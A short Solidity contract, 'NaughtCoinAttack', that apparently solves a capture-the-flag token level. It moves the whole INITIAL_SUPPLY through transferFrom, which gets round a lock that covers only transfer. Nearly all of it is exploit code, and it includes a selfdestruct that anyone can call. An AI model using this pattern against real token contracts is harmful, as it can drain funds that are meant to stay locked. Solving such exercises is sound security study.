// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function INITIAL_SUPPLY() external view returns(uint256);
    function player() external view returns(address);
    function transfer(address _to, uint256 _value) external returns(bool);
    function approve(address _spender, uint256 _value) external returns(bool);
    function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
}

contract NaughtCoinAttack {

    INaughtCoin public victim;
    address public owner;

    constructor(address _victim) {
        victim = INaughtCoin(_victim);
        owner = msg.sender;
    }

    function attack() public {
        uint amount = victim.INITIAL_SUPPLY();
        victim.transferFrom(owner, address(this), amount);
    }

    function getSupply() public view returns(uint256) {
        return victim.INITIAL_SUPPLY();
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }

}